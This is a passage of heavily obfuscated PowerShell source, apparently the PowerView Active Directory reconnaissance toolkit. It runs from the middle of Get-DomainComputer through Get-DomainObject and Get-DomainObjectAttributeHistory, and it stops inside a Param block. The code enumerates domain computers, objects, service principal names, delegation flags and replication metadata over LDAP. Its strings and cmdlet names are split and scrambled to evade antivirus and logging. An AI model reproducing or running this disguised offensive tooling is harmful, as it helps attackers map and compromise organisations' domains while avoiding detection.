                &("{2}{1}{0}" -f'e','erbos','Write-V') ("{12}{1}{2}{14}{11}{5}{16}{3}{0}{9}{13}{8}{4}{15}{6}{10}{7}"-f'omp','Domai','nC','c','d ',' ','nti','er principals',' are truste','u','cate for oth',' Searching','[Get-','ters that','omputer]','to authe','for ')
                ${f`ILter} += (("{7}{5}{1}{0}{2}{6}{3}{4}"-f 'llowed','s-a','tod','egateto','=*)','d','el','(ms'))
            }
            if (${PSBOunD`pA`RAM`eTERs}[("{0}{1}{2}" -f 'Pr','i','nters')]) {
                &("{3}{4}{0}{2}{1}" -f '-','e','Verbos','Wri','te') ("{7}{6}{3}{5}{8}{4}{1}{2}{0}" -f 'nters','fo','r pri','r] Sear',' ','chi','pute','[Get-DomainCom','ng')
                ${f`iLter} += (("{2}{5}{1}{4}{3}{0}"-f'ueue)','ectCategory=pri','(o','Q','nt','bj'))
            }
            if (${Psb`OUndPArAME`T`E`Rs}['SPN']) {
                &("{2}{0}{3}{1}"-f 'Ve','se','Write-','rbo') ('[Ge'+'t-D'+'omainComputer'+'] '+'S'+'ea'+'rching '+'for'+' '+'comput'+'ers'+' '+'w'+'ith '+'SPN:'+' '+"$SPN")
                ${F`IlteR} += "(servicePrincipalName=$SPN)"
            }
            if (${PSb`OUNDpARA`M`EtERs}[("{2}{1}{4}{3}{0}" -f'stem','e','Op','y','ratingS')]) {
                &("{1}{3}{2}{0}" -f'erbose','Write','V','-') ('[Get-Do'+'mai'+'n'+'Compu'+'ter] '+'Sea'+'rchi'+'ng '+'for'+' '+'compu'+'te'+'r'+'s '+'w'+'ith '+'o'+'pe'+'ratin'+'g '+'s'+'yst'+'em: '+"$OperatingSystem")
                ${filt`eR} += "(operatingsystem=$OperatingSystem)"
            }
            if (${PSbO`Un`dPa`RaMEt`ErS}[("{2}{0}{1}" -f 'rv','icePack','Se')]) {
                &("{2}{1}{3}{0}" -f 'bose','r','W','ite-Ver') ('[Get-D'+'o'+'mainC'+'o'+'mp'+'uter] '+'Sear'+'chin'+'g '+'for'+' '+'compu'+'ter'+'s '+'w'+'ith '+'servic'+'e'+' '+'pac'+'k: '+"$ServicePack")
                ${Fi`L`TEr} += "(operatingsystemservicepack=$ServicePack)"
            }
            if (${pS`BOUnD`pa`R`AMeTe`Rs}[("{1}{0}"-f 'e','SiteNam')]) {
                &("{4}{1}{2}{0}{3}" -f'Ver','rit','e-','bose','W') ('[Get-'+'Dom'+'ain'+'Computer'+']'+' '+'S'+'ear'+'ching '+'for'+' '+'compu'+'t'+'er'+'s '+'wit'+'h '+'site'+' '+'na'+'m'+'e: '+"$SiteName")
                ${FIl`T`Er} += "(serverreferencebl=$SiteName)"
            }
            if (${pSBOuNdPAra`M`eTe`Rs}[("{1}{0}{2}" -f'e','LDAPFilt','r')]) {
                &("{1}{2}{0}" -f 'te-Verbose','Wr','i') ('[Get-'+'Do'+'mai'+'nC'+'omputer]'+' '+'Usin'+'g '+'addi'+'t'+'ional '+'LDA'+'P '+'f'+'il'+'ter: '+"$LDAPFilter")
                ${FI`lTEr} += "$LDAPFilter"
            }
            
            ${UAc`F`IlTER} | &("{0}{1}{2}{3}" -f'Wh','ere-','Objec','t') {${_}} | &("{1}{0}{2}" -f 'c','ForEach-Obje','t') {
                if (${_} -match ("{0}{2}{1}" -f'N','_.*','OT')) {
                    ${uA`cfI`ElD} = ${_}.("{2}{0}{1}" -f'bs','tring','Su').Invoke(4)
                    ${uACva`lue} = [Int](${U`AcE`NUm}::${UA`CFIE`LD})
                    ${F`IlT`Er} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${UA`CVA`LUE} = [Int](${Ua`CEn`Um}::${_})
                    ${fiL`TeR} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            ${cOMpS`ea`RC`HEr}."f`IltEr" = "(&(samAccountType=805306369)$Filter)"
            &("{1}{3}{0}{2}"-f 'rbos','Wri','e','te-Ve') "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter) "

            if (${pSB`OUnDPa`RaMe`TErs}[("{0}{1}"-f 'Find','One')]) { ${ResU`Lts} = ${COMpSea`R`CH`ER}.("{1}{0}" -f 'ndOne','Fi').Invoke() }
            else { ${RE`sulTS} = ${c`oMpSe`AR`CHeR}.("{1}{0}" -f'dAll','Fin').Invoke() }
            ${rEs`UlTS} | &("{1}{0}{2}"-f'b','Where-O','ject') {${_}} | &("{0}{3}{2}{1}" -f'F','bject','ach-O','orE') {
                ${u`P} = ${tr`UE}
                if (${P`SB`oUN`d`pa`RAmetErs}[("{1}{0}"-f 'ing','P')]) {
                    ${u`P} = &("{0}{2}{1}{3}"-f'Te','t-Con','s','nection') -Count 1 -Quiet -ComputerName ${_}."pr`OPErTI`es"."d`N`s`hoStnaME"
                }
                if (${up}) {
                    if (${pSbOU`N`D`PARA`MEterS}['Raw']) {
                        
                        ${cO`MpuT`ER} = ${_}
                        ${cO`MPU`TeR}."Pso`BJect"."TypEna`m`eS".("{1}{0}" -f'nsert','I').Invoke(0, ("{1}{0}{2}{3}{4}{5}"-f 'Vie','Power','w.Comp','u','ter.Ra','w'))
                    }
                    else {
                        ${C`o`mpUter} = &("{0}{3}{1}{2}"-f'Convert-LD','Pro','perty','AP') -Properties ${_}."PRoP`ERti`Es"
                        ${ComP`U`TER}."pSo`BJ`EcT"."tY`pEn`A`Mes".("{0}{1}" -f 'I','nsert').Invoke(0, ("{2}{1}{3}{0}{4}"-f'te','iew.Comp','PowerV','u','r'))
                    }
                    ${co`M`PUtEr}
                }
            }
            if (${r`ESUL`Ts}) {
                try { ${REsul`Ts}.("{0}{1}{2}"-f'd','isp','ose').Invoke() }
                catch {
                    &("{1}{3}{2}{0}" -f 'se','Write-','o','Verb') ('[Ge'+'t-'+'Dom'+'ai'+'nCom'+'puter] '+'E'+'rror '+'di'+'sposin'+'g '+'of'+' '+'t'+'he '+'Resul'+'t'+'s '+'obje'+'c'+'t: '+"$_")
                }
            }
            ${cOMPSear`C`HEr}.("{1}{0}"-f'spose','di').Invoke()
        }
    }
}


function geT-`doMaI`N`obJE`Ct {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{8}{9}{2}{3}{4}{6}{5}{1}{0}{7}" -f 'g','Assi','Va','rs','Mo','n','reTha','nments','PSUseD','eclared'}, '')]
    [OutputType({"{0}{2}{1}{3}" -f'Powe','View.AD','r','Object'})]
    [OutputType({"{5}{6}{1}{0}{4}{2}{3}"-f 'Objec','AD','a','w','t.R','Pow','erView.'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsItIon = 0, vaLUeFROmpipeLiNE = ${t`RUe}, VALUeFROmPIPeLiNebypRopErtynAme = ${Tr`Ue})]
        [Alias({"{0}{1}{2}{3}"-f'Distinguis','he','dN','ame'}, {"{3}{2}{0}{1}{4}" -f 'un','t','cco','SamA','Name'}, {"{1}{0}"-f 'ame','N'}, {"{2}{0}{3}{6}{5}{4}{1}" -f'e','ame','M','mberDi','guishedN','n','sti'}, {"{0}{2}{1}"-f 'Mem','erName','b'})]
        [String[]]
        ${ide`Nt`iTy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dom`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f'F','il','ter'})]
        [String]
        ${Lda`pFiLt`eR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PR`O`PeRTIEs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f'th','SPa','AD'})]
        [String]
        ${Sear`C`H`BaSe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}{3}"-f'nCon','Domai','tro','ller'})]
        [String]
        ${sE`RVer},

        [ValidateSet({"{0}{1}" -f'Ba','se'}, {"{0}{2}{1}"-f'O','eLevel','n'}, {"{1}{0}" -f 'ee','Subtr'})]
        [String]
        ${seaRCHS`C`o`pE} = ("{1}{0}{2}"-f'ub','S','tree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`suLt`p`AgeSIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sErVeR`T`i`mE`LiMIT},

        [ValidateSet({"{0}{1}"-f'Dac','l'}, {"{1}{0}" -f 'oup','Gr'}, {"{1}{0}"-f 'ne','No'}, {"{0}{1}"-f'Own','er'}, {"{0}{1}" -f 'Sa','cl'})]
        [String]
        ${sEcu`RIty`M`AS`ks},

        [Switch]
        ${tOMbS`To`NE},

        [Alias({"{2}{1}{0}"-f'ne','nO','Retur'})]
        [Switch]
        ${f`i`NdoNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CREdE`N`T`IAl} =  $21gV7e::"e`mPTy",

        [Switch]
        ${R`Aw}
    )

    DynamicParam {
        ${u`A`cvA`Lue`NamEs} =  ( VAriaBLE 6heI4).vALuE::("{1}{2}{0}"-f 's','GetNa','me').Invoke(${UacE`N`Um})
        
        ${UAcVaLu`E`NAm`ES} = ${ua`CvA`lUen`AM`Es} | &("{1}{2}{0}{3}{4}"-f 'h-Ob','ForE','ac','je','ct') {${_}; "NOT_$_"}
        
        &("{5}{2}{4}{1}{0}{3}"-f'cParamet','nami','w-','er','Dy','Ne') -Name ("{2}{1}{0}"-f'ter','Fil','UAC') -ValidateSet ${uACV`Al`UeNames} -Type ([array])
    }

    BEGIN {
        ${sE`ArCH`erar`gUmE`NTs} = @{}
        if (${P`sBouN`dPA`RAme`TeRs}[("{1}{0}" -f 'omain','D')]) { ${SeaRC`HeraRGu`ME`NTs}[("{1}{0}"-f'omain','D')] = ${DOm`AIn} }
        if (${pS`B`oUNDpaRam`etErs}[("{1}{2}{0}"-f'es','Prop','erti')]) { ${se`ArCh`E`RarGUmENtS}[("{1}{2}{0}" -f 'ties','Prope','r')] = ${Pro`PErT`I`eS} }
        if (${PSBOund`p`Ar`AmE`TeRs}[("{0}{2}{1}" -f'Se','rchBase','a')]) { ${sE`Arc`H`eRarG`UmE`NTs}[("{0}{1}{2}"-f'Se','ar','chBase')] = ${SEArcH`B`A`sE} }
        if (${psb`O`UNdP`AraM`etErs}[("{0}{1}" -f'Serv','er')]) { ${sea`RCHeR`ARGum`ENts}[("{0}{2}{1}" -f 'Se','er','rv')] = ${s`ERVer} }
        if (${ps`BoUndparAmE`TE`RS}[("{2}{0}{1}{3}"-f 'rch','S','Sea','cope')]) { ${SEA`Rc`HErarGuME`NTS}[("{1}{0}{2}" -f'arch','Se','Scope')] = ${SEAR`CHsc`OpE} }
        if (${PsboUndP`A`RAME`T`ERS}[("{1}{2}{0}" -f'ze','Res','ultPageSi')]) { ${seARCh`eR`ARgume`NTs}[("{0}{3}{2}{1}"-f 'Result','ze','ageSi','P')] = ${re`SulTPA`gE`s`iZE} }
        if (${PS`Bo`UN`DPa`RAmEtERS}[("{1}{4}{0}{3}{2}"-f'im','Serv','imit','eL','erT')]) { ${s`e`Arch`e`RAr`gumEnTS}[("{0}{1}{2}{4}{3}"-f 'S','er','verT','eLimit','im')] = ${S`ErV`eRtim`ELiMIt} }
        if (${P`sb`oUndpArame`TERs}[("{0}{1}{2}"-f 'Securit','yM','asks')]) { ${searc`HeRarG`UM`EnTs}[("{1}{2}{3}{0}"-f'ks','Securit','y','Mas')] = ${SE`cuRI`T`ymas`Ks} }
        if (${ps`BOuNdP`A`RA`M`eteRS}[("{2}{0}{1}"-f 'ton','e','Tombs')]) { ${seARChE`Ra`RGuM`ENts}[("{0}{1}"-f'Tombst','one')] = ${To`MBs`TO`Ne} }
        if (${p`s`Bou`N`dpa`RameteRS}[("{0}{1}{3}{2}" -f'Cr','ed','tial','en')]) { ${SeA`R`ChErARg`Um`En`TS}[("{2}{0}{3}{1}" -f'de','tial','Cre','n')] = ${c`R`edeNt`ial} }
        ${OBj`ecTSEa`RCHER} = &("{2}{4}{0}{1}{3}" -f 'n','Sea','Get-D','rcher','omai') @SearcherArguments
    }

    PROCESS {
        
        if (${psBOun`DPaRAmE`Te`RS} -and (${PsBOUNDpA`R`Am`E`TeRS}."Co`UnT" -ne 0)) {
            &("{1}{5}{2}{3}{4}{0}" -f 'eter','N','a','mic','Param','ew-Dyn') -CreateVariables -BoundParameters ${P`SB`OU`NdPA`Ram`eTERs}
        }
        if (${oB`j`ecT`sEA`RcHEr}) {
            ${ID`enTiTyFIl`T`er} = ''
            ${f`ilt`er} = ''
            ${iDEn`Ti`TY} | &("{2}{1}{0}{3}" -f'r','he','W','e-Object') {${_}} | &("{2}{3}{1}{0}"-f 'Object','ach-','F','orE') {
                ${I`dEnt`ITyin`STaNce} = ${_}.("{2}{1}{0}" -f'lace','ep','R').Invoke('(', '\28').("{0}{2}{1}"-f 'Re','lace','p').Invoke(')', '\29')
                if (${ID`En`TiTy`i`NsTan`Ce} -match ("{1}{0}"-f'1-','^S-')) {
                    ${IdeNt`I`T`yfIl`TeR} += "(objectsid=$IdentityInstance)"
                }
                elseif (${i`D`Ent`iT`yiNSt`AnCE} -match ((("{0}{4}{3}{2}{1}"-f'^','=','0}DC)','OU{','(CN{0}')) -F[CHar]124)) {
                    ${iDeNTITy`FiL`T`Er} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${p`s`BoUNDpA`Ramet`ERs}[("{1}{0}" -f'main','Do')]) -and (-not ${PS`BOUnDp`Ar`AMe`TERs}[("{2}{1}{0}" -f'se','hBa','Searc')])) {
                        
                        
                        ${Ide`NT`I`TYdo`MaiN} = ${Id`eNT`iTY`I`Nsta`Nce}.("{0}{1}"-f'SubSt','ring').Invoke(${IdeNT`IT`y`In`ST`Ance}.("{1}{0}"-f'xOf','Inde').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{0}{1}{2}"-f 'W','r','ite-Verbose') ('[Get-'+'D'+'omainO'+'bj'+'ec'+'t] '+'Extr'+'act'+'ed '+'dom'+'ain '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        ${SeA`RChe`RA`R`gUMenTs}[("{1}{2}{0}"-f'in','D','oma')] = ${iDentity`DOM`A`in}
                        ${ObJe`CTS`EArc`h`er} = &("{1}{4}{2}{0}{3}"-f 'arc','Get-D','e','her','omainS') @SearcherArguments
                        if (-not ${OBjE`ctsearc`h`Er}) {
                            &("{1}{4}{2}{0}{3}"-f'in','W','Warn','g','rite-') ('[Get'+'-'+'DomainObj'+'e'+'ct'+'] '+'Un'+'ab'+'le '+'t'+'o '+'r'+'et'+'rieve '+'dom'+'a'+'in '+'s'+'earcher '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${Id`ENT`ITy`INSTance} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${gUIdBYt`E`sT`Ring} = (([Guid]${idE`NtiTy`iNst`ANcE}).("{2}{1}{3}{0}"-f 'y','oByt','T','eArra').Invoke() | &("{1}{2}{0}{3}" -f 'Objec','ForE','ach-','t') { '\' + ${_}.("{1}{0}" -f'ing','ToStr').Invoke('X2') }) -join ''
                    ${idEN`TITYfiL`T`Er} += "(objectguid=$GuidByteString)"
                }
                elseif (${I`D`ENTITy`insTA`NcE}.("{0}{1}" -f 'Co','ntains').Invoke('\')) {
                    ${cOn`V`ErTE`di`dentI`T`YinStANCE} = ${I`dE`NtI`TYINs`TAnCE}.("{0}{1}{2}" -f'R','e','place').Invoke('\28', '(').("{1}{0}{2}" -f 'plac','Re','e').Invoke('\29', ')') | &("{2}{3}{1}{0}" -f'Name','D','Conv','ert-A') -OutputType ("{1}{0}{2}" -f'nica','Cano','l')
                    if (${cO`NV`eRTEDIDent`iT`YIn`STaNce}) {
                        ${objEc`Td`oMaiN} = ${cONvERTEd`IDenT`It`yI`NSt`AncE}.("{2}{0}{1}"-f'u','bString','S').Invoke(0, ${COnVertE`di`deNtITYI`Nst`Ance}.("{1}{0}"-f'exOf','Ind').Invoke('/'))
                        ${ObJeC`Tn`A`ME} = ${Ide`NT`ITYI`NST`ANCE}.("{1}{0}" -f 'lit','Sp').Invoke('\')[1]
                        ${iDE`Nt`ItYF`iL`Ter} += "(samAccountName=$ObjectName)"
                        ${S`EarcHeRarGU`M`eN`TS}[("{1}{0}" -f 'main','Do')] = ${O`BjEC`TdOm`A`iN}
                        &("{2}{3}{0}{4}{1}" -f 'e-','e','Wri','t','Verbos') ('['+'Ge'+'t-DomainObj'+'e'+'ct] '+'E'+'xtra'+'cted'+' '+'doma'+'in '+"'$ObjectDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${ObJEC`TS`EA`RCHeR} = &("{1}{3}{0}{2}" -f'ar','Get-Dom','cher','ainSe') @SearcherArguments
                    }
                }
                elseif (${I`d`ENtiT`Y`INstaNCe}.("{1}{0}{2}" -f'ont','C','ains').Invoke('.')) {
                    ${IDE`NT`i`T`YfIlteR} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    ${IDE`N`TiTyfiLt`ER} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if (${i`dEnTiTYf`ilteR} -and (${iD`Ent`ItYF`il`TEr}.("{1}{0}" -f 'rim','T').Invoke() -ne '') ) {
                ${FI`lTeR} += "(|$IdentityFilter)"
            }

            if (${p`Sb`oUNdpaR`Am`Et`ERS}[("{2}{0}{1}" -f 'ilt','er','LDAPF')]) {
                &("{1}{2}{0}{3}"-f'Verbos','W','rite-','e') ('['+'G'+'et-Do'+'m'+'ain'+'Object] '+'U'+'sing '+'add'+'i'+'tional'+' '+'LDA'+'P '+'fil'+'ter'+': '+"$LDAPFilter")
                ${fil`T`eR} += "$LDAPFilter"
            }

            
            ${uaCfI`lt`eR} | &("{0}{1}{2}"-f'Wher','e-Ob','ject') {${_}} | &("{0}{3}{1}{2}{4}"-f 'ForEach-','b','je','O','ct') {
                if (${_} -match ("{1}{0}" -f'T_.*','NO')) {
                    ${uACfIE`ld} = ${_}.("{3}{0}{2}{1}" -f 'u','g','bstrin','S').Invoke(4)
                    ${uAC`V`ALue} = [Int](${uA`CEn`UM}::${uAcfie`ld})
                    ${F`ILT`eR} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${UA`c`VaLue} = [Int](${u`ACE`Num}::${_})
                    ${FI`LTEr} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            if (${F`iLt`eR} -and ${f`IL`TeR} -ne '') {
                ${oB`j`EctsEa`R`Cher}."F`IL`Ter" = "(&$Filter)"
            }
            &("{2}{1}{0}"-f'e','Verbos','Write-') "[Get-DomainObject] Get-DomainObject filter string: $($ObjectSearcher.filter) "

            if (${PSBOunDPaR`AM`et`erS}[("{0}{1}{2}"-f 'F','i','ndOne')]) { ${Re`sul`TS} = ${Ob`JECtSe`Arch`ER}.("{0}{1}"-f'FindO','ne').Invoke() }
            else { ${reS`U`lts} = ${oBj`ectsEA`R`Ch`er}.("{1}{0}"-f'dAll','Fin').Invoke() }
            ${re`S`ULTs} | &("{1}{2}{0}"-f'-Object','Whe','re') {${_}} | &("{1}{2}{0}"-f 't','ForEach-Obj','ec') {
                if (${psb`oUn`D`P`ArAmETeRS}['Raw']) {
                    
                    ${o`BJect} = ${_}
                    ${Ob`J`Ect}."PsO`B`JECt"."TyP`E`NaMEs".("{1}{0}{2}"-f 'se','In','rt').Invoke(0, ("{2}{1}{5}{4}{3}{0}" -f 'w','e','Pow','a','Object.R','rView.AD'))
                }
                else {
                    ${o`BJ`ECT} = &("{2}{1}{0}{4}{3}"-f'op','Pr','Convert-LDAP','ty','er') -Properties ${_}."P`ROPERti`eS"
                    ${OBje`ct}."pso`B`jECt"."T`Y`p`EnAMES".("{0}{1}" -f 'Inser','t').Invoke(0, ("{0}{4}{2}{3}{1}"-f'PowerV','ct','b','je','iew.ADO'))
                }
                ${O`B`ject}
            }
            if (${R`es`ULtS}) {
                try { ${ReSUL`TS}.("{2}{1}{0}" -f'pose','s','di').Invoke() }
                catch {
                    &("{0}{1}{2}" -f'W','rite-','Verbose') ('[Get-Doma'+'i'+'nObject'+'] '+'Er'+'r'+'or '+'disposi'+'n'+'g '+'of'+' '+'t'+'he '+'Res'+'ul'+'ts '+'obje'+'ct:'+' '+"$_")
                }
            }
            ${Obje`Ctse`ARC`her}.("{0}{1}" -f 'dis','pose').Invoke()
        }
    }
}


function gET-DoMA`iNOBJect`AtTRIbUTEH`IS`To`Ry {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{5}{2}{0}{1}{3}{6}"-f 're','dVarsMo','la','reThanAssig','P','SUseDec','nments'}, '')]
    [OutputType({"{4}{8}{6}{3}{9}{1}{7}{2}{0}{10}{5}"-f 'is','ibut','H','b','PowerVie','y','O','e','w.AD','jectAttr','tor'})]
    [CmdletBinding()]
    Param(
        [Parameter(positiON = 0, vaLUefrOMPiPEliNe = ${tR`UE}, VAlUEfRoMPIPeLINeBYpRopErtyName = ${Tr`UE})]
        [Alias({"{0}{3}{2}{1}" -f'D','me','hedNa','istinguis'}, {"{0}{1}{2}" -f'Sam','Account','Name'}, {"{1}{0}"-f 'e','Nam'}, {"{3}{2}{6}{0}{7}{4}{5}{1}"-f'sting','me','e','Memb','he','dNa','rDi','uis'}, {"{2}{0}{1}" -f'r','Name','Membe'})]
        [String[]]
        ${I`DentI`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`MAIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f 'Fil','er','t'})]
        [String]
        ${LDap`F`iLTEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pro`pERti`eS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f 'ath','DSP','A'})]
        [String]
        ${SeARc`HbA`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{4}{2}{3}{1}"-f'Domai','ler','C','ontrol','n'})]
        [String]
        ${seR`V`Er},

        [ValidateSet({"{0}{1}" -f'Ba','se'}, {"{2}{1}{0}" -f 'el','eLev','On'}, {"{2}{0}{1}"-f'ubt','ree','S'})]
        [String]
        ${SE`ARCH`s`Cope} = ("{1}{0}{2}"-f 'b','Su','tree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`ES`Ul`TP`AGEsize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERV`ert`I`meLimiT},

        [Switch]
        ${tomBS`T`one},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREdEN`Ti`Al} =  (ls  VarIABLe:21GV7e ).VaLue::"EM`Pty",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${seArC`HeRa`RGUmEN`Ts} = @{
            ("{3}{2}{1}{0}"-f'es','rti','pe','Pro')    =   ("{2}{0}{4}{5}{3}{6}{1}"-f'-rep','ta','msds','tad','lattri','buteme','a'),("{3}{0}{1}{4}{2}" -f 's','ting','ame','di','uishedn')
            'Raw'           =   ${t`Rue}
        }
        if (${P`Sb`OUndpar`AmETers}[("{0}{1}"-f 'Dom','ain')]) { ${s`eaRcHe`Ra`RGUmE`NTS}[("{1}{0}"-f 'n','Domai')] = ${d`oMaIn} }
        if (${pSbo`U`NdpARaMEt`e`Rs}[("{0}{2}{1}" -f 'L','r','DAPFilte')]) { ${sea`RC`He`RArGuME`NTS}[("{3}{1}{0}{2}"-f 't','l','er','LDAPFi')] = ${Ldap`FiL`TeR} }
        if (${PSboUN`DP`ARaM`ETe`Rs}[("{1}{0}{3}{2}" -f'c','Sear','Base','h')]) { ${seARCH`E`RARGUm`Ents}[("{3}{2}{1}{0}"-f'ase','hB','c','Sear')] = ${S`e`ArCHBaSE} }
        if (${P`sboundParAm`E`T`eRs}[("{2}{1}{0}" -f 'er','rv','Se')]) { ${S`e`Ar`chERA`RgU`MeNTs}[("{1}{0}"-f 'ver','Ser')] = ${S`ERVeR} }
        if (${PS`BoUNDPA`RAM`eT`erS}[("{1}{2}{0}" -f 'cope','Search','S')]) { ${sEaRcHeR`AR`GU`MEN`Ts}[("{0}{1}{2}{3}" -f'Sear','chS','cop','e')] = ${sEA`RcH`S`CopE} }
        if (${PsbOUN`dParA`me`Te`Rs}[("{3}{0}{1}{4}{2}"-f 's','ultPa','ze','Re','geSi')]) { ${Sear`CH`er`Arg`UmenTs}[("{1}{0}{3}{2}"-f'ultPage','Res','ze','Si')] = ${REs`UlTP`AgeSIZE} }
        if (${Psbo`U`NDP`ARaMEtE`RS}[("{1}{2}{4}{0}{3}"-f'e','S','erverTi','Limit','m')]) { ${SEaRcHEraR`GumE`N`TS}[("{0}{4}{1}{3}{2}" -f 'S','v','t','erTimeLimi','er')] = ${s`e`R`VeRTIMe`Lim`it} }
        if (${P`sBo`UndpA`RametErS}[("{0}{1}"-f 'Tombston','e')]) { ${SeaR`CheR`AR`gUmeNTS}[("{1}{0}" -f'mbstone','To')] = ${TOmBS`To`NE} }
        if (${P`SBo`UNDp`ArAmEt`erS}[("{0}{1}"-f'F','indOne')]) { ${SeaR`cH`EraRGU`menTS}[("{1}{0}" -f 'indOne','F')] = ${f`INdO`Ne} }
        if (${PsBoUNdP`A`RAMETE`RS}[("{1}{0}{2}" -f't','Creden','ial')]) { ${S`eAr`CH`eRAR`guMEntS}[("{1}{2}{0}" -f'l','Cre','dentia')] = ${cr`Ed`enTi`Al} }

        if (${Ps`BoUNd`p`Ar`AMetERs}[("{1}{0}{2}" -f 'roper','P','ties')]) {
            ${PR`Op`ERtY`FI`LTER} = ${ps`BouNdp`Ar`AMETe`RS}[("{0}{1}{2}" -f'Pr','ope','rties')] -Join '|'
        }
        else {
            ${PrOp`e`RtYfiL`TEr} = ''
        }
    }

    PROCESS {
        if (${psB`OuNdpArA`mete`RS}[("{2}{0}{1}"-f'd','entity','I')]) { ${s`ea`RCh`eRa`RgUments}[("{0}{1}"-f'Identi','ty')] = ${I`D`ENtity} }

        &("{3}{1}{0}{2}"-f 'inO','a','bject','Get-Dom') @SearcherArguments | &("{3}{1}{2}{0}" -f'ect','orEa','ch-Obj','F') {
            ${O`Bj`eCtDN} = ${_}."pr`OPEr`T`ieS"[("{2}{1}{0}{3}" -f 'ednam','tinguish','dis','e')][0]
            ForEach(${x`m`lNode} in ${_}."p`R`OpERTiES"[("{4}{1}{7}{2}{8}{5}{3}{6}{0}" -f'a','pl','tt','et','msds-re','butem','adat','a','ri')]) {
                ${Te`MPob`J`ECt} = [xml]${xm`L`NOdE} | &("{0}{2}{1}"-f 'Select','Object','-') -ExpandProperty ("{4}{6}{1}{0}{5}{3}{2}"-f'A','_REPL_','A','TR_META_DAT','D','T','S') -ErrorAction ("{0}{1}{2}{3}{4}" -f'Silently','Co','nti','nu','e')
                if (${tE`MpOBJE`Ct}) {
                    if (${Tem`P`obJ`Ect}."p`S`ZATTrI`ButEN`Ame" -Match ${PrOPERTYFI`L`Ter}) {
                        ${ouT`P`Ut} = &("{2}{0}{1}" -f 'j','ect','New-Ob') ("{0}{1}"-f'P','SObject')
                        ${OuT`pUt} | &("{2}{1}{0}" -f'Member','-','Add') ("{3}{2}{1}{0}" -f 'y','t','teProper','No') ("{1}{0}{2}" -f'D','Object','N') ${oBj`eCT`Dn}
                        ${oU`TP`UT} | &("{2}{1}{0}" -f 'ember','M','Add-') ("{0}{1}{3}{2}" -f 'NoteP','roper','y','t') ("{2}{1}{0}{3}" -f 'teNa','u','Attrib','me') ${T`e`mpOBjeCT}."p`SZA`TtrIBut`en`AmE"
                        ${oUt`p`UT} | &("{1}{2}{0}" -f 'ber','Add-','Mem') ("{0}{1}{2}{3}" -f'No','teProper','t','y') ("{1}{3}{2}{0}{6}{4}{5}" -f'n','L','i','astOrig','ting','Change','a') ${TEMp`Ob`JECt}."fTI`ME`lAstori`g`INatiNg`Ch`AnGE"
                        ${Ou`TpUt} | &("{0}{1}{2}" -f'Ad','d-','Member') ("{0}{2}{1}" -f'NoteProp','rty','e') ("{1}{0}" -f'ersion','V') ${t`e`Mpo`BJECt}."dW`Ve`RsI`On"
                        ${O`UT`Put} | &("{1}{3}{2}{0}" -f 'mber','A','Me','dd-') ("{0}{1}{2}" -f 'Note','Prope','rty') ("{2}{0}{4}{3}{1}{5}"-f 'a','t','L','rigina','stO','ingDsaDN') ${tEmpo`Bj`eCt}."pSzl`Asto`R`IGI`NaTIng`D`sadN"
                        ${O`U`TPuT}."P`s`oBject"."tYpENa`M`ES".("{1}{0}"-f'rt','Inse').Invoke(0, ("{0}{8}{7}{3}{2}{6}{4}{5}{1}"-f'Po','istory','ectAttr','bj','te','H','ibu','rView.ADO','we'))
                        ${oU`T`pUt}
                    }
                }
                else {
                    &("{2}{0}{3}{1}" -f 't','e','Wri','e-Verbos') ('[G'+'et-Do'+'main'+'Ob'+'jectAt'+'tribut'+'e'+'Histor'+'y] '+'Er'+'ror '+'retr'+'ieving'+' '+('I'+'Oymsds-re'+'plat'+'tribut'+'em'+'etadata'+'IOy ')."rE`pL`ACE"(([char]73+[char]79+[char]121),[STRINg][char]39)+'fo'+'r '+"'$ObjectDN'")
                }
            }
        }
    }
}


function gET-dom`Ai`NObJECTl`inKEdAtt`RIBU`Teh`ist`OrY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{3}{0}{6}{1}{2}{4}" -f'claredVarsMoreTha','s','ignment','eDe','s','PSUs','nAs'}, '')]
    [OutputType({"{11}{7}{4}{1}{6}{10}{0}{9}{2}{3}{8}{5}"-f'DO','rVi','ectLin','kedAttribute','we','y','ew','o','Histor','bj','.A','P'})]
    [CmdletBinding()]
    Param(
